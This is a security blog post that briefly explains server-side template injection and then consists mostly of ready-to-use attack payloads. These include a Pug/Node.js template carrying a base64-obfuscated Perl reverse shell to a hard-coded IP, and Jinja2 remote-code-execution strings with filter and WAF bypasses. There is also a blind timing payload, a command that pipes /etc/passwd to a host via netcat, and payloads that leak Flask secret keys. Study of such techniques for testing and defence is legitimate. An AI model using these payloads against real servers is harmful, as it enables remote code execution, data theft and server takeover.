---
title: SSTI-With Jinja2 \ PUG - NODEJS
published: 2025-09-10
description: 'Explain this Vulnerability'
image: ''
tags: ['SSTI','Payload','Py']
category: 'VULNERABILITY'
draft: false 
lang: ''
---

# Understanding Server-Side Template Injection (SSTI)

## What is SSTI?

A **Server-Side Template Injection (SSTI)** occurs when user input is directly embedded and rendered within a template on the server. Templates are often used to make small changes to web pages without regenerating the entire HTML file for every request.

For example:

```html
<h1>Welcome to the page!</h1>
<u>This page is being accessed from the remote address: {{ip}}</u>
```

Here, the `{{ip}}` placeholder is dynamically replaced by the server with the visitor’s IP address.

If developers do not properly sanitize user input, an attacker may inject malicious template code. Many template engines (like **Jinja2**) support advanced logic, which attackers can abuse to execute arbitrary commands on the underlying server.

This can escalate to **Remote Code Execution (RCE)**.

---

## SSTI REVERSE SHELL 'PUG - NODEJS'
```nodejs
h1= title
p Welcome to #{3*3}

#{spawn_sync = this.process.binding('spawn_sync')}
#{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};}}
#{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;}}
#{payload='dXNlIFNvY2tldDskaT0iMTkyLjE2OC4xMTkuMTI0IjskcD00NDM7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Cg=='}
#{resp=spawnSync('perl',['-e',(new Buffer(payload, 'base64')).toString('ascii')])}
```

---

## RCE Payloads in Jinja2

### Basic Payload
```jinja2
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Bypassing WAF Filters

- **If “.” is blocked:**
```jinja2
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
```

- **If “.” and “_” are blocked:**
```jinja2
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
```

- **Full bypass (no `.`, `_`, `[]`, `|join`):**
```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## RCE Without `{{ }}`

Jinja2 allows multiple template delimiters beyond `{{}}`.

- **Using `{% %}` conditionals:**
```jinja2
{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('whoami')['read']() == 'chiv\n' %} a {% endif %}
```

- **Blind Command Injection (via timing):**
```jinja2
{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('sleep 5')['read']() == 'chiv' %} a {% endif %}
```

- **Exfiltrating data via HTTP:**
```jinja2
{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat /etc/passwd | nc HOSTNAME 1337')['read']() == 'chiv' %} a {% endif %}
```

---

## Extracting Sensitive Data

- **Leak the secret key:**
```jinja2
{{config["SECRET_KEY"]}}
```

- **If `config` is blocked:**
```jinja2
{{self.__dict__}}
```

---

## Filter Bypasses

- **Format string trick:**
```jinja2
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

This reconstructs `__class__` dynamically, bypassing filters.

---

## Listing Classes & Subclasses

```jinja2
{{OBJECT.__class__.mro().__subclasses__()}}
{{OBJECT.__class__.__mro__[1].__subclasses__()}}
```

Where `OBJECT` could be `g`, `request`, `config`, `application`, etc.

---

## Step-by-Step Payload Development

Example with `get_flashed_messages`:

```jinja2
{{get_flashed_messages}}
{{get_flashed_messages.__class__}}
{{get_flashed_messages.__class__.__mro__}}
{{get_flashed_messages.__class__.__mro__[1].__subclasses__()}}
{{get_flashed_messages.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

---

## Encoding Tricks

- **Hex encoding filenames:**
```jinja2
{{''.__class__.__mro__[2].__subclasses__()[40]('\x2F\x65\x74\x63\x2F\x70\x61\x73\x73\x77\x64').read()}}
```

---

## Dot (`.`) WAF Bypass

- **Normal:**
```jinja2
{{ foo.bar }}
```

- **Bypass with brackets:**
```jinja2
{{ foo['bar'] }}
```

- **Bypass with `|attr`:**
```jinja2
{{ foo|attr('bar') }}
```

---

## Useful Flask Filters

- `join` → Joins a list into a string
- `safe` → Disables HTML escaping
- `attr` → Access attributes dynamically

Example:
```jinja2
{{['Thi','s wi','ll b','e appended']|join}}
```

Output:
```
This will be appended
```

---

## Inspecting Objects with `__dict__`

```jinja2
{{g.__class__.__mro__[1].__subclasses__()[289].__dict__}}
```

View only keys:
```jinja2
{{...__dict__.keys()}}
```

---

## Key Notes on Attribute Access in Jinja2

- `foo.bar`
  1. Check attribute `bar`
  2. Else, check `foo['bar']`

- `foo['bar']`
  1. Check item `'bar'`
  2. Else, check attribute

- `attr()` → Only checks attributes.

---

## Conclusion

SSTI vulnerabilities in frameworks like Flask (Jinja2) can easily escalate to **Remote Code Execution**, allowing attackers to steal sensitive information, exfiltrate files, and take full control of servers.

Understanding payload construction, filter bypasses, and encoding tricks is crucial for both attackers and defenders.

---

## References

- [Jinja2 Templates](https://jinja.palletsprojects.com/en/2.11.x/templates/)
- [PortSwigger: SSTI Research](https://portswigger.net/research/server-side-template-injection)
- [PayloadAllTheThings – SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Flask Template Filters](https://jinja.palletsprojects.com/en/2.11.x/templates/#builtin-filters)
- [SecGus on Twitter](https://twitter.com/SecGus)
